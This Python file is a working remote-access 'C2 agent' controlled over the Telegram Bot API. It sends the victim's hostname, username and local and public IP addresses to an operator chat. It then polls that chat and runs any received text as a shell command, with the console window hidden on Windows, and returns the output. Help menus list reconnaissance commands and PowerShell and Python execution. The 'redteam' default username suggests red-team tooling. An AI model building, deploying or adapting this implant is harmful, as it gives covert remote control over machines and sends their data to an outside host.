
import requests
import time
import subprocess
import os
import socket
import sys
import platform
from datetime import datetime

# ============================================================================
# CONFIGURATION
# ============================================================================
BOT_TOKEN = "XXXXXXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
CHAT_ID = "XXXXXXXXXXX"

BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ============================================================================
# GLOBAL VARIABLES - ADDED IS_RUNNING HERE
# ============================================================================
IS_RUNNING = True  # ADDED THIS LINE
LAST_UPDATE_ID = 0  # ADDED THIS LINE

# ============================================================================
# PROPER OS DETECTION
# ============================================================================

def detect_os():
    """Robust OS detection using multiple methods"""
    # Method 1: platform.system() - most reliable
    system_name = platform.system()
    
    if system_name == "Darwin":
        return "macOS", "🍎"
    elif system_name == "Linux":
        return "Linux", "🐧"
    elif system_name == "Windows":
        return "Windows", "🖥️"
    elif system_name:
        return system_name, "💻"
    
    # Method 2: sys.platform
    plat = sys.platform.lower()
    if plat.startswith('darwin'):
        return "macOS", "🍎"
    elif plat.startswith('linux'):
        return "Linux", "🐧"
    elif plat.startswith('win'):
        return "Windows", "🖥️"
    elif 'bsd' in plat:
        return "BSD", "🔶"
    
    # Method 3: os.name
    if os.name == 'posix':
        # Could be macOS or Linux, check uname
        try:
            result = subprocess.run(['uname', '-s'], capture_output=True, text=True)
            uname_output = result.stdout.strip().lower()
            if 'darwin' in uname_output:
                return "macOS", "🍎"
            else:
                return "Linux", "🐧"
        except:
            return "Unix", "🐚"
    elif os.name == 'nt':
        return "Windows", "🖥️"
    
    return "Unknown", "❓"

OS_NAME, OS_EMOJI = detect_os()
IS_WINDOWS = OS_NAME == "Windows"
IS_MACOS = OS_NAME == "macOS"
IS_LINUX = OS_NAME == "Linux"

# ============================================================================
# AGENT ID GENERATION
# ============================================================================

def generate_agent_id():
    """Generate OS-prefixed agent ID"""
    hostname = socket.gethostname().split('.')[0]  # Remove domain if present
    pid = os.getpid()
    timestamp = int(time.time())
    
    # Use proper prefix based on OS
    if IS_MACOS:
        prefix = "MAC"
    elif IS_LINUX:
        prefix = "LIN"
    elif IS_WINDOWS:
        prefix = "WIN"
    else:
        prefix = "UNX"
    
    return f"{prefix}-{hostname}-{pid}-{timestamp}"

AGENT_ID = generate_agent_id()

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def get_ips():
    """Get IP addresses (cross-platform)"""
    hostname = socket.gethostname()
    
    # Private IP
    try:
        if IS_WINDOWS:
            # Windows method
            private_ip = socket.gethostbyname(hostname)
        else:
            # Unix method - try multiple approaches
            try:
                # Try socket connection method
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                private_ip = s.getsockname()[0]
                s.close()
            except:
                # Fallback to hostname resolution
                private_ip = socket.gethostbyname(hostname)
    except:
        private_ip = "unknown"
    
    # Public IP
    try:
        public_ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        public_ip = "unknown"
    
    return hostname, private_ip, public_ip

def safe_execute(cmd):
    """Execute command safely (cross-platform)"""
    try:
        # Windows-specific flag
        creationflags = subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0
        
        # Handle command conversions
        cmd_lower = cmd.lower()
        
        if IS_WINDOWS:
            if cmd_lower == "ls":
                cmd = "dir"
            elif cmd_lower.startswith("ls "):
                cmd = "dir " + cmd[3:]
            elif cmd_lower == "ifconfig":
                cmd = "ipconfig"
            elif cmd_lower == "pwd":
                cmd = "cd"
        else:
            if cmd_lower == "dir":
                cmd = "ls -la"
            elif cmd_lower == "ipconfig":
                cmd = "ifconfig"
        
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=30,
            creationflags=creationflags,
            text=True,
            encoding='utf-8' if not IS_WINDOWS else 'cp1252',
            errors='replace'
        )
        
        output = f"{OS_EMOJI} Command: {cmd}\n"
        output += f"📊 Exit Code: {result.returncode}\n"
        
        if result.stdout:
            output += f"📄 Output:\n{result.stdout}\n"
        if result.stderr:
            output += f"⚠️ Errors:\n{result.stderr}\n"
        
        # Truncate for Telegram
        if len(output) > 3900:
            output = output[:3900] + "\n...[truncated]"
        
        return output
        
    except subprocess.TimeoutExpired:
        return "⏰ Timeout after 30 seconds"
    except Exception as e:
        return f"❌ Error: {str(e)}"

def send_message(chat_id, text, parse_mode=None):
    """Send message to Telegram"""
    try:
        payload = {"chat_id": chat_id, "text": text}
        if parse_mode:
            payload["parse_mode"] = parse_mode
        
        response = requests.post(
            f"{BASE_URL}/sendMessage",
            json=payload,
            timeout=10
        )
        
        if response.status_code == 200:
            return True
        else:
            print(f"[-] Send failed: HTTP {response.status_code}")
            if response.text:
                print(f"    Response: {response.text[:100]}")
            
    except Exception as e:
        print(f"[-] Send error: {e}")
    
    return False

def get_updates(offset=0):
    """Get updates from Telegram"""
    try:
        payload = {"offset": offset, "timeout": 5}
        response = requests.get(
            f"{BASE_URL}/getUpdates",
            params=payload,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("ok"):
                return data.get("result", [])
            else:
                error_desc = data.get("description", "Unknown")
                print(f"[-] Telegram API error: {error_desc}")
                
                # Handle conflict error
                if "Conflict" in error_desc:
                    print("[!] ERROR: Another client using same bot token!")
                    print("[!] Fix: Stop other agent instances")
        
        elif response.status_code == 409:
            print("[!] ERROR 409: Another bot instance polling")
            print("[!] Make sure only ONE instance runs per bot token")
    
    except Exception as e:
        print(f"[-] Get updates error: {e}")
    
    return []

# ============================================================================
# COMMAND PROCESSING
# ============================================================================

def send_startup_message():
    """Send OS-correct startup message"""
    hostname, private_ip, public_ip = get_ips()
    
    # Get OS-specific details
    os_details = get_os_details()
    
    # Build message
    message = f"{OS_EMOJI} **{OS_NAME} Agent Online**\n"
    message += f"🆔 `{AGENT_ID}`\n"
    message += f"🏷️ `{hostname}`\n"
    message += f"👤 `{os.environ.get('USERNAME', os.environ.get('USER', 'redteam'))}`\n"
    
    # Add OS version if available
    if os_details.get('version'):
        message += f"📦 `{os_details['version']}`\n"
    
    message += f"🔒 Local IP: `{private_ip}`\n"
    message += f"🌐 Public IP: `{public_ip}`\n"
    message += f"⏰ `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
    
    # OS-specific note
    if IS_WINDOWS:
        message += f"\n_Ready for Windows commands. Use `/help` for options._"
    else:
        message += f"\n_Ready for Unix commands. Use `/help` for options._"
    
    if send_message(CHAT_ID, message, parse_mode="Markdown"):
        print(f"[+] {OS_NAME} startup message sent")
        return True
    else:
        print(f"[-] Failed to send {OS_NAME} startup message")
        return False

def send_disconnect_message(reason="Normal shutdown"):
    """Send proper disconnect message"""
    disconnect_msg = (
        f"{OS_EMOJI} **{OS_NAME} Agent Disconnected**\n"
        f"🆔 `{AGENT_ID}`\n"
        f"📛 Reason: `{reason}`\n"
        f"⏰ `{datetime.now().strftime('%H:%M:%S')}`\n"
        f"\n_Agent stopped. Will not reconnect automatically._"
    )
    
    send_message(CHAT_ID, disconnect_msg, parse_mode="Markdown")
    print(f"[+] {OS_NAME} disconnect message sent")

def get_os_details():
    """Get OS-specific details"""
    details = {"version": "Unknown"}
    
    try:
        if IS_MACOS:
            result = subprocess.run(["sw_vers", "-productVersion"], 
                                  capture_output=True, text=True)
            details["version"] = f"macOS {result.stdout.strip()}"
            
        elif IS_LINUX:
            if os.path.exists("/etc/os-release"):
                with open("/etc/os-release") as f:
                    for line in f:
                        if "PRETTY_NAME" in line:
                            details["version"] = line.split("=")[1].strip().strip('"')
                            break
            else:
                result = subprocess.run(["uname", "-r"], capture_output=True, text=True)
                details["version"] = f"Linux {result.stdout.strip()}"
                
        elif IS_WINDOWS:
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                   r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                product_name = winreg.QueryValueEx(key, "ProductName")[0]
                winreg.CloseKey(key)
                details["version"] = product_name
            except:
                result = subprocess.run(["ver"], capture_output=True, text=True, shell=True)
                details["version"] = result.stdout.strip()
    
    except:
        pass
    
    return details

def process_help_command(chat_id):
    """Send OS-specific help"""
    if IS_WINDOWS:
        help_text = """
🖥️ **Windows C2 Commands**

🔧 **System Info:**
`/sysinfo` - Windows system information
`/whoami` - Current user with privileges
`/hostname` - Computer name
`/cd` - Current directory
`/ver` - Windows version

📁 **File Operations:**
`/dir` - List files
`/dir C:\\` - List specific directory
`/type file.txt` - View file contents
`/tree` - Directory tree

🌐 **Network Commands:**
`/ipconfig` - Network configuration
`/ipconfig /all` - Detailed network info
`/netstat -ano` - Network connections
`/ping google.com` - Network test

🖥️ **System Commands:**
`/tasklist` - Running processes
`/tasklist /svc` - Processes with services
`/services` - List Windows services
`/net users` - List users
`/systeminfo` - Detailed system info

💾 **Disk & Memory:**
`/wmic logicaldisk get size,freespace,caption` - Disk info
`/wmic memorychip get capacity` - Memory info

💻 **Shell Commands:**
`/shell <command>` - Execute CMD command
`/ps <command>` - Execute PowerShell
`/python <code>` - Run Python code

📊 **Examples:**
`/shell whoami /all`
`/dir C:\\Users`
`/ipconfig /all`
`/tasklist /svc`
`/netstat -ano`

⚠️ **Note:** This is a Windows agent.
"""
    else:
        # Unix (macOS/Linux) help
        if IS_MACOS:
            os_note = "macOS"
        else:
            os_note = "Linux"
            
        help_text = f"""
{OS_EMOJI} **{os_note} C2 Commands**

🔧 **System Info:**
`/sysinfo` - System information
`/whoami` - Current user
`/hostname` - Computer name
`/pwd` - Current directory
`/uname -a` - System info

📁 **File Operations:**
`/ls` - List files
`/ls -la` - Detailed list
`/ls /path` - List specific directory
`/cat file.txt` - View file
`/find . -name "*.txt"` - Find files

🌐 **Network Commands:**
`/ifconfig` - Network interfaces
`/ip a` - Modern network info
`/netstat -tulpn` - Network connections
`/ss -tulpn` - Socket statistics
`/ping -c 3 google.com` - Network test

🖥️ **Process Commands:**
`/ps aux` - All processes
`/top -b -n 1` - Process snapshot
`/htop` - Interactive (if installed)
`/kill <pid>` - Kill process

📊 **System Monitoring:**
`/df -h` - Disk usage
`/free -h` - Memory usage
`/uptime` - System uptime
`/w` - Logged in users

💻 **Shell Commands:**
`/shell <command>` - Execute shell command
`/python3 <code>` - Run Python code
`/bash <script>` - Execute bash script

🎯 **Examples:**
`/shell whoami`
`/ls -la /home`
`/ifconfig`
`/ps aux | grep python`
`/df -h`

⚠️ **Note:** This is a {os_note} agent.
"""
    
    send_message(chat_id, help_text)

def process_sysinfo_command(chat_id):
    """Get detailed OS-specific system info"""
    try:
        message = f"{OS_EMOJI} **{OS_NAME} System Information**\n\n"
        
        # Basic info
        hostname, private_ip, public_ip = get_ips()
        message += f"• **Agent ID:** `{AGENT_ID}`\n"
        message += f"• **Hostname:** `{hostname}`\n"
        message += f"• **User:** `{os.environ.get('USERNAME', os.environ.get('USER', 'redteam'))}`\n"
        message += f"• **OS:** `{OS_NAME}`\n"
        
        # OS version
        os_details = get_os_details()
        if os_details.get('version') != "Unknown":
            message += f"• **Version:** `{os_details['version']}`\n"
        
        message += f"• **Python:** `{sys.version.split()[0]}`\n"
        message += f"• **Local IP:** `{private_ip}`\n"
        message += f"• **Public IP:** `{public_ip}`\n"
        
        # OS-specific details
        if IS_WINDOWS:
            try:
                # Windows info
                result = subprocess.run(["systeminfo"], capture_output=True, text=True, 
                                      shell=True, timeout=5)
                lines = result.stdout.split('\n')
                for line in lines[:10]:  # First 10 lines
                    if "OS Name:" in line or "OS Version:" in line:
                        message += f"• **{line.strip()}**\n"
            except:
                pass
                
        elif IS_MACOS:
            try:
                # macOS info
                result = subprocess.run(["sw_vers"], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if line:
                        message += f"• **{line}**\n"
            except:
                pass
                
        elif IS_LINUX:
            try:
                # Linux info
                result = subprocess.run(["uname", "-a"], capture_output=True, text=True)
                message += f"• **Kernel:** `{result.stdout.strip()}`\n"
            except:
                pass
        
        # Common info
        try:
            # Current directory
            message += f"• **Current Dir:** `{os.getcwd()}`\n"
            
            # Disk space
            if IS_WINDOWS:
                result = subprocess.run(["wmic", "logicaldisk", "get", "size,freespace,caption"], 
                                      capture_output=True, text=True)
                disk_lines = result.stdout.strip().split('\n')
                if len(disk_lines) > 1:
                    message += f"• **Disks:** `{disk_lines[1][:50]}...`\n"
            else:
                result = subprocess.run(["df", "-h", "."], capture_output=True, text=True)
                lines = result.stdout.strip().split('\n')
                if len(lines) > 1:
                    message += f"• **Disk:** `{lines[1]}`\n"
        except:
            pass
        
        message += f"\n⏰ Time: `{datetime.now().strftime('%H:%M:%S')}`"
        
        send_message(chat_id, message, parse_mode="Markdown")
        
    except Exception as e:
        send_message(chat_id, f"❌ Sysinfo error: {e}")

def process_command(cmd_text, chat_id):
    """Process incoming command"""
    # Remove leading slash
    if cmd_text.startswith('/'):
        cmd_text = cmd_text[1:]
    
    cmd_lower = cmd_text.lower()
    
    # Handle special commands
    if cmd_lower == "help" or cmd_text == "":
        process_help_command(chat_id)
        return True
    
    elif cmd_lower == "sysinfo":
        process_sysinfo_command(chat_id)
        return True
    
    elif cmd_lower == "whoami":
        if IS_WINDOWS:
            result = safe_execute("whoami /all")
        else:
            result = safe_execute("whoami")
        send_message(chat_id, result)
        return True
    
    elif cmd_lower in ["ls", "dir"]:
        if IS_WINDOWS:
            result = safe_execute("dir")
        else:
            result = safe_execute("ls -la")
        send_message(chat_id, result)
        return True
    
    elif cmd_lower in ["pwd", "cd"]:
        result = safe_execute("cd" if IS_WINDOWS else "pwd")
        send_message(chat_id, f"Current directory:\n{result}")
        return True
    
    elif cmd_lower in ["ipconfig", "ifconfig", "ip"]:
        if IS_WINDOWS:
            result = safe_execute("ipconfig /all")
        elif IS_MACOS:
            result = safe_execute("ifconfig")
        else:
            result = safe_execute("ip a")
        send_message(chat_id, result)
        return True
    
    elif cmd_lower == "ps":
        if IS_WINDOWS:
            result = safe_execute("tasklist")
        else:
            result = safe_execute("ps aux")
        send_message(chat_id, result)
        return True
    
    elif cmd_lower == "hostname":
        result = safe_execute("hostname")
        send_message(chat_id, f"Hostname: {result}")
        return True
    
    elif cmd_lower.startswith("shell "):
        actual_cmd = cmd_text[6:]
        print(f"[+] Executing shell: {actual_cmd}")
        result = safe_execute(actual_cmd)
        send_message(chat_id, result)
        return True
    
    # Default command
    print(f"[+] Executing: {cmd_text}")
    result = safe_execute(cmd_text)
    send_message(chat_id, result)
    return True

# ============================================================================
# MAIN AGENT LOOP
# ============================================================================

def main():
    global IS_RUNNING, LAST_UPDATE_ID  # ADDED global declaration
    
    print("=" * 60)
    print(f"{OS_EMOJI} {OS_NAME.upper()} TELEGRAM C2 AGENT")
    print("=" * 60)
    print(f"[*] Agent ID: {AGENT_ID}")
    print(f"[*] Hostname: {socket.gethostname()}")
    print(f"[*] User: {os.environ.get('USERNAME', os.environ.get('USER', 'redteam'))}")
    print(f"[*] OS: {OS_NAME} {OS_EMOJI}")
    print(f"[*] Detected via: {platform.system()} | {sys.platform}")
    print("=" * 60)
    
    # Send startup message
    print(f"[*] Sending {OS_NAME} startup message...")
    send_startup_message()
    
    print(f"[+] {OS_NAME} agent started. Waiting for commands...")
    print(f"[*] Send /help in Telegram for {OS_NAME} commands")
    print("[*] Press Ctrl+C to stop gracefully")
    print("=" * 60)
    
    LAST_UPDATE_ID = 0
    
    try:
        while IS_RUNNING:
            try:
                updates = get_updates(LAST_UPDATE_ID + 1)
                
                if updates:
                    print(f"[+] Received {len(updates)} update(s)")
                    
                    for update in updates:
                        LAST_UPDATE_ID = update["update_id"]
                        
                        if "message" in update and "text" in update["message"]:
                            message = update["message"]
                            chat_id = str(message["chat"]["id"])
                            text = message.get("text", "").strip()
                            
                            if chat_id == CHAT_ID:
                                print(f"[+] Command from {chat_id}: {text}")
                                process_command(text, chat_id)
                
                time.sleep(2)
                
            except KeyboardInterrupt:
                print(f"\n[*] Shutdown requested for {OS_NAME} agent")
                IS_RUNNING = False
                break
                
            except Exception as e:
                print(f"[-] Loop error: {e}")
                time.sleep(5)
    
    finally:
        # Always send disconnect message
        print(f"\n[*] {OS_NAME} agent shutting down...")
        send_disconnect_message("Normal shutdown")
        print(f"[+] {OS_NAME} agent stopped")

# ============================================================================
# CLEANUP FOR WINDOWS COMPATIBILITY
# ============================================================================

if __name__ == "__main__":
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Windows compatibility
    if IS_WINDOWS:
        # Fix Windows console encoding
        import codecs
        if sys.stdout.encoding != 'utf-8':
            sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
            sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
    
    try:
        main()
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        
        # Try to send error message
        try:
            error_msg = f"💥 {OS_NAME} Agent {AGENT_ID} crashed: {str(e)[:100]}"
            send_message(CHAT_ID, error_msg)
        except:
            pass